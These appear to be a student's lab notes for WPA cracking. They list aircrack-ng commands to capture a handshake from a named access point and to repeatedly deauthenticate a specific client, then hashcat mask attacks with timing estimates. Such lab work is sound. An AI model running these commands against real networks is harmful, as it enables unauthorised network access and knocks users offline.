# resource: https://www.aircrack-ng.org/doku.php?id=cracking_wpa

# start
sudo ./scripts/airmon-ng start wlo1

# see information
sudo ./airodump-ng wlo1mon
# target AP
#   SSID: Palace of Joe Tsai
#   MAC: 94:BF:C4:32:CC:88
#   CH: 4

# dump 4 way handshake
sudo ./airodump-ng --bssid 94:BF:C4:32:CC:88 -w handshake-dump wlo1mon
# find victim client
#   MAC: 8C:88:2B:00:73:6E

# deauthenticate the client
sudo ./aireplay-ng -0 0 -a 94:BF:C4:32:CC:88 -c 8C:88:2B:00:73:6E wlo1mon

# done
sudo ./scripts/airmon-ng stop wlo1mon

# convert hash (hashcat-utils)
./cap2hccapx.bin handshake-dump-01.cap output.hccapx

# crack
./hashcat.bin -m 2500 -a 3 output.hccapx '?d?d?d?d?d?d?d?d'
# on linux5, estimated 3hr
./hashcat.bin -m 2500 -a 3 -w 4 output.hccapx '09?d?d?d?d?d?d?d?d'
# on meow1, estimated 1min43sec


# task 2
sudo ./scripts/airmon-ng start wlo1
# wireshark capture, set wifi password
sudo ./airodump-ng -c 4 --bssid 94:BF:C4:32:CC:88 -w handshake-dump wlo1mon
sudo ./aireplay-ng -0 1 -a 94:BF:C4:32:CC:88 -c 8C:88:2B:00:73:6E wlo1mon
# wireshark keep capturing for 10 min, should see HTTP traffic
sudo ./scripts/airmon-ng stop wlo1mon

# task 2
# when running wireshark, airodump and aireplay should be stopped

# task 3
sudo ./aireplay-ng -0 0 -a 94:BF:C4:32:CC:88 -c 8C:88:2B:00:73:6E wlo1mon
